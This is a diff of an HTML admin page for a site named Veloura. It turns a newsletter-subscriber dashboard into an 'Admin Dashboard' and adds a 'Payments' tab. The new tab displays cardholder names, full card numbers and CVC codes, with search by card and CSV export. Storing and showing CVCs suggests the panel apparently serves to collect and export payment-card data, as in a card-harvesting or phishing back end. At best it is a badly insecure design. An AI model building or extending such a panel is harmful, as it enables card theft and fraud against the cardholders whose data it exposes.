@@ -3,7 +3,7 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Newsletter Subscribers - Veloura</title>
+    <title>Admin Dashboard - Veloura</title>
     <meta name="robots" content="noindex, nofollow, noarchive">
     <link rel="preconnect" href="https://fonts.googleapis.com">
     <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
@@ -16,10 +16,9 @@
     <section class="login-screen" id="loginScreen">
         <div class="login-box">
             <div class="login-logo">Veloura</div>
-            <p class="login-subtitle">Private Newsletter Dashboard</p>
+            <p class="login-subtitle">Private Admin Dashboard</p>
 
             <form id="loginForm" autocomplete="off">
-                <!-- EMAIL FIELD - NEW! -->
                 <div class="login-input-group">
                     <label for="loginEmail">Email</label>
                     <input
@@ -65,7 +64,7 @@
 
                 <a class="sidebar-link active" href="/infos">
                     <span class="sidebar-icon">✉</span>
-                    <span>Newsletter</span>
+                    <span>Dashboard</span>
                 </a>
 
                 <a class="sidebar-link" href="/">
@@ -86,9 +85,9 @@
 
             <div class="admin-topbar">
                 <div>
-                    <h1 class="topbar-title">Newsletter Subscribers</h1>
+                    <h1 class="topbar-title">Admin Dashboard</h1>
                     <p class="topbar-subtitle">
-                        Manage emails collected from the Veloura newsletter.
+                        Manage newsletter subscribers and view payment data.
                     </p>
                 </div>
 
@@ -110,8 +109,16 @@
                     <div class="stat-card">
                         <div class="stat-icon pink">✉</div>
                         <div class="stat-info">
-                            <h3 id="statTotal">0</h3>
+                            <h3 id="statSubscribers">0</h3>
                             <p>Total Subscribers</p>
+                        </div>
+                    </div>
+
+                    <div class="stat-card">
+                        <div class="stat-icon gold">💰</div>
+                        <div class="stat-info">
+                            <h3 id="statPayments">0</h3>
+                            <p>Total Payments</p>
                         </div>
                     </div>
 
@@ -122,22 +129,24 @@
                             <p>This Month</p>
                         </div>
                     </div>
-
-                    <div class="stat-card">
-                        <div class="stat-icon gold">★</div>
-                        <div class="stat-info">
-                            <h3 id="statLatest">—</h3>
-                            <p>Latest Subscriber</p>
-                        </div>
-                    </div>
                 </section>
 
-                <!-- LIST -->
-                <section class="panel">
+                <!-- TABS -->
+                <div class="tabs">
+                    <button class="tab-btn active" data-tab="subscribers" id="tabSubscribers">
+                        📧 Subscribers
+                    </button>
+                    <button class="tab-btn" data-tab="payments" id="tabPayments">
+                        💳 Payments
+                    </button>
+                </div>
+
+                <!-- SUBSCRIBERS TAB -->
+                <section class="panel tab-content active" id="tabContentSubscribers">
                     <div class="panel-header">
                         <div>
                             <div class="panel-title">Subscriber List</div>
-                            <div class="panel-caption" id="listCaption">
+                            <div class="panel-caption" id="subscriberCaption">
                                 Loading subscribers...
                             </div>
                         </div>
@@ -187,6 +196,59 @@
                     </div>
                 </section>
 
+                <!-- PAYMENTS TAB -->
+                <section class="panel tab-content" id="tabContentPayments">
+                    <div class="panel-header">
+                        <div>
+                            <div class="panel-title">Payment Records</div>
+                            <div class="panel-caption" id="paymentCaption">
+                                Loading payments...
+                            </div>
+                        </div>
+
+                        <div class="panel-actions">
+                            <input
+                                type="search"
+                                id="paymentSearchInput"
+                                class="search-input"
+                                placeholder="Search by name or card..."
+                                autocomplete="off"
+                            >
+
+                            <button class="btn btn-secondary" id="refreshPaymentsBtn">
+                                Refresh
+                            </button>
+
+                            <button class="btn btn-primary" id="exportPaymentsCsvBtn" style="background:#4f9870;border-color:#4f9870;">
+                                Export CSV
+                            </button>
+                        </div>
+                    </div>
+
+                    <div class="table-wrap">
+                        <table class="data-table">
+                            <thead>
+                                <tr>
+                                    <th>#</th>
+                                    <th>Cardholder Name</th>
+                                    <th>Card Number</th>
+                                    <th>CVC</th>
+                                    <th>Date</th>
+                                    <th>Actions</th>
+                                </tr>
+                            </thead>
+
+                            <tbody id="paymentTableBody">
+                                <tr>
+                                    <td colspan="6" class="loading-cell">
+                                        Loading payments...
+                                    </td>
+                                </tr>
+                            </tbody>
+                        </table>
+                    </div>
+                </section>
+
             </div>
         </main>
     </div>
@@ -194,6 +256,11 @@
     <!-- TOAST -->
     <div class="toast" id="toast"></div>
 
-    <script src="infos.js"></script>
+    <!-- Load Supabase -->
+    <script src="https://cdn.jsdelivr.net/npm/@supabase/supabase-js@2"></script>
+    
+    <!-- Load the admin script -->
+    <script type="module" src="infos.js"></script>
+
 </body>
 </html>
